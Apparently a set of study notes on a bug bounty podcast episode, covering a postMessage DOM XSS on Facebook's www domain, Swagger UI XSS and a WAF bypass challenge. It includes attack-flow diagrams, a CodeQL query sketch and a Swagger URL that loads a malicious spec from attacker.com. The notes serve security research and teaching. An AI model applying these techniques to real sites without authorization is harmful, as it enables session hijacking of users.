# EP49: Nagli's Automation, Source Code Leaks & Facebook DOM XSS - Client-Side Security Notes

| Field        | Value                                                              |
|--------------|--------------------------------------------------------------------|
| **Guests**   | Justin Gardner (@rhynorater), Gal Nagli (@user)                   |
| **Date**     | Late 2023 (pre-2024 LHE season)                                   |
| **Episode**  | Critical Thinking Bug Bounty Podcast - Episode 49                  |
| **Focus**    | Automation, source code leaks -> RCE, Swagger API abuse, Facebook DOM XSS via postMessage |

> **Client-Side Content Density: LOW-MEDIUM.** This episode is primarily about automation, live hacking events, and server-side exploitation chains. However, there is one significant client-side finding discussed: a DOM-based XSS via postMessage on Facebook's www subdomain, discovered during the South Korea LHE. There are also tangential references to Swagger UI XSS and WAF bypass challenges. The notes below extract every client-side-relevant segment.

---

## Technique: DOM XSS via postMessage on Embedded Third-Party Library (Facebook www)

**Context:** During the Facebook/Meta live hacking event in South Korea, Nagli collaborated with Joel (TechnoGeek) and Space Raccoon. They found an XSS on `www.facebook.com` through a third-party open-source library (likely Excalidraw) that was embedded within Facebook's domain.

### How It Works

1. **Recon with CodeQL:** Joel was running CodeQL static analysis against JavaScript code from an open-source library embedded within Facebook's www subdomain.

2. **CodeQL identifies postMessage sink:** CodeQL flagged a potential XSS flow involving a `postMessage` event listener in the embedded third-party code. As Nagli notes: "if CodeQL tells you there's XSS, you're far away from actually seeing the pop-up" -- meaning CodeQL found the data flow but a working exploit required manual effort.

3. **Cross-reference with prior research:** Space Raccoon had previously found a very similar postMessage-based DOM XSS in the same open-source library on a different major company. He had a public blog post detailing the full exploitation chain.

4. **Adapt existing exploit:** Space Raccoon looked at the Facebook instance, made modifications to his prior exploit ("modification here, modification there"), and had a working XSS within 20 minutes.

5. **Impact:** DOM XSS on `www.facebook.com` -- described by Facebook/Meta staff as "super rare to see on www." Paid well at the LHE.

```
Attack Flow:

  [Attacker Page]
       |
       | window.postMessage({ ... malicious payload ... }, "*")
       |
       v
  [www.facebook.com/embedded-library]
       |
       | Event listener receives message
       | No origin check (or insufficient origin validation)
       | Tainted data flows to DOM sink
       |
       v
  [DOM XSS executes in www.facebook.com context]
       |
       v
  [Full access to victim's Facebook session]
```

### Why This Works

- **Third-party code embedded on first-party domain:** When companies embed open-source libraries (Excalidraw, PDF viewers, rich text editors, etc.) directly into their main domain, any vulnerability in that library executes in the context of the parent origin. This is a pattern seen repeatedly in high-value targets.

- **postMessage listeners without proper origin validation:** The embedded library accepted `postMessage` events without adequately checking `event.origin`. This means any attacker-controlled page can send a crafted message to trigger the vulnerable code path.

- **Open-source code is auditable:** Because the library is open source, attackers can use static analysis tools like CodeQL to systematically find data flows from `postMessage` event handlers to dangerous sinks (`innerHTML`, `eval`, `document.write`, etc.).

- **Prior art transfers across targets:** The same open-source library is embedded by multiple large companies. A vulnerability found on Company A can often be adapted to Company B with minor modifications. Space Raccoon's prior blog post on a different target directly transferred to Facebook.

### Where To Apply This

1. **Identify embedded third-party libraries on high-value targets.** Look for open-source projects (Excalidraw, Monaco Editor, PDF.js, CodeMirror, TinyMCE, etc.) loaded on the main domain (not sandboxed in an iframe on a different origin).

2. **Run CodeQL or Semgrep against the open-source source code.** Query for:
   - `postMessage` event listeners -> DOM sinks
   - `window.addEventListener("message", ...)` handlers
   - Missing or weak `event.origin` checks

3. **Search for prior CVEs and bug reports** in those libraries. If someone found a postMessage XSS in Library X on Target A, check if Target B also embeds Library X and whether the same version is deployed.

4. **Check if the library is sandboxed.** If it runs in an iframe on `library.facebook.com` (different origin), the impact is limited. If it runs directly on `www.facebook.com`, it is a full XSS on the main domain.

```javascript
// Example CodeQL query concept for postMessage -> DOM XSS
// (simplified pseudocode, not exact CodeQL syntax)

// Source: postMessage event data
// from EventListener el, DataFlow::Node source, DataFlow::Node sink
// where
//   el.getEventType() = "message" and
//   source = el.getParameter(0).getAPropertyRead("data") and
//   sink.asExpr() instanceof InnerHtmlWrite
// select source, sink, "postMessage data flows to innerHTML"
```

---

## Technique: Swagger UI XSS (Brief Reference)

**Context:** While discussing Swagger file enumeration, Nagli mentions XSS on Swagger UI instances. He notes this attack class has become less viable recently.

### How It Works

Swagger UI has historically had DOM XSS vulnerabilities where attacker-controlled input (via URL parameters) could be injected into the rendered page. Older versions of Swagger UI were particularly susceptible.

```
Attack vector (historical):

https://target.com/swagger-ui/?url=https://attacker.com/malicious-spec.json

  [Swagger UI loads attacker-controlled API spec]
       |
       | Spec contains crafted values in description fields
       | Older versions render HTML/JS from spec without sanitization
       |
       v
  [DOM XSS in target.com context]
```

### Why This Works

- Swagger UI renders user-supplied content from API specification files
- Older versions did not sanitize HTML in description fields or other spec properties
- The `url` parameter allows loading external specification files controlled by the attacker

### Where To Apply This

- Nagli's assessment: **"Barely work these days, most of them are fixed."** Unless you find a new zero-day in Swagger UI, this is low-probability.
- Still worth checking: enumerate Swagger UI instances and check their version. Very old deployments may still be vulnerable.
- More productive angle: use Swagger files for **unauthenticated API access** rather than client-side XSS.

---

## Technique: WAF Bypass Challenge for XSS (Brief Reference)

**Context:** During the Vegas LHE, Nagli found an XSS but could not bypass the WAF. He challenged Frans Rosen (elite XSS researcher) with a 10-minute timer and $2,000 cash to bypass it. Frans could not do it in 10 minutes either.

### Key Takeaway

- Some WAFs are genuinely difficult to bypass even for top researchers
- Nagli states it "would be a zero day" to bypass this particular WAF
- When you find an XSS behind a WAF, document:
  - The exact WAF product and version if identifiable
  - What payloads you tried
  - Whether the WAF is blocking based on pattern matching, CSP, or DOM sanitization
- Even without a bypass, the underlying vulnerability may still be reportable depending on the program's stance

---

## Technique: Using CodeQL for Client-Side Vulnerability Discovery

**Context:** Joel (TechnoGeek) used CodeQL to analyze JavaScript source code of an open-source library before the Facebook LHE, identifying candidate XSS flows.

### How It Works

1. **Obtain the source code** of open-source libraries embedded in target applications
2. **Create a CodeQL database** from the JavaScript source
3. **Run taint-tracking queries** that trace data from sources (postMessage, URL parameters, etc.) to sinks (innerHTML, eval, document.write, etc.)
4. **Manually verify** CodeQL findings -- as Nagli notes, a CodeQL alert is "far away from actually seeing the pop-up"
5. **Craft working exploit** based on the identified data flow

```
Workflow:

  [Identify open-source lib on target]
       |
       v
  [Clone source code from GitHub]
       |
       v
  [Build CodeQL database]
       |
       v
  [Run XSS taint-tracking queries]
       |
       v
  [Review results - filter false positives]
       |
       v
  [Manual exploitation on live target]
```

### Where To Apply This

- Best for **large JavaScript codebases** where manual review is impractical
- Particularly effective against open-source libraries embedded on high-value targets
- Combine with existing CVE research -- CodeQL can find variants of known bugs
- CodeQL supports JavaScript/TypeScript analysis natively

---

## Key Quotes

> **Nagli on the Facebook XSS:** "It was some DOM post-message stuff. Basically, we found embedded inside www, they had some service which was open source."

> **Nagli on CodeQL vs. exploitation:** "If CodeQL tells you there's XSS, you're far away from actually seeing the pop-up."

> **Nagli on Space Raccoon's adaptation speed:** "He just looked at it, okay, modification here, modification there. He has public blog about another very similar [bug], just detailed all the way, so took him 20 minutes and we got our very good bug for the event."

> **Nagli on Swagger UI XSS:** "Looking for XSSes, which barely work these days, most of them are fixed, unless someone wants to find a new zero day on Swagger and it will be very, very good."

> **Justin on the Facebook XSS rarity:** "Even Yousef, one of the best triagers on Facebook, said it's super rare to see XSS on www."

> **Nagli on the WAF bypass challenge:** "I set up a timer of 10 minutes and I put cash near him... he couldn't [bypass it]. It would be a zero [day]."

---

## Resources & References

| Resource | Description |
|----------|-------------|
| **Excalidraw** (github.com/excalidraw/excalidraw) | Open-source whiteboard tool -- likely the embedded library referenced in the Facebook XSS |
| **CodeQL for JavaScript** (codeql.github.com) | Static analysis engine used by Joel to find the postMessage -> XSS flow |
| **Space Raccoon's blog** | Referenced as having a public writeup of a very similar postMessage XSS in the same library on another target (exact URL not provided in episode) |
| **Swagger UI XSS history** | Multiple CVEs exist for older Swagger UI versions (CVE-2016-5641, CVE-2018-25031, CVE-2019-17495, etc.) |
| **Shockwave (shockwave.cloud)** | Nagli's ASM + bug bounty platform, used for automated scanning and target management |

---

## Summary Table

| # | Technique | Type | Impact | Complexity |
|---|-----------|------|--------|------------|
| 1 | DOM XSS via postMessage on embedded open-source library (Facebook www) | DOM XSS / postMessage | Critical -- full XSS on www.facebook.com | Medium -- required CodeQL + prior research + manual adaptation |
| 2 | Swagger UI XSS via malicious spec URL | DOM XSS | Medium -- depends on what is hosted on the Swagger domain | Low historically, but most instances now patched |
| 3 | WAF bypass for XSS exploitation | Client-side bypass | High -- if bypassed, enables XSS on protected endpoint | High -- even top researchers could not bypass in this case |
| 4 | CodeQL static analysis for JS client-side vuln discovery | Tooling / methodology | Enables finding DOM XSS at scale in open-source libraries | Medium -- requires CodeQL setup and query writing |

---

**Note:** The majority of Episode 49 covers server-side topics (wwwroot.zip source code disclosure -> ASP.NET ViewState deserialization -> RCE, Swagger API -> S3 bucket read, PHP type juggling CVE exploitation, live hacking event logistics, and bug bounty motivation). The client-side content is concentrated in the Facebook LHE discussion around the postMessage DOM XSS finding, with brief references to Swagger UI XSS and WAF bypass challenges.
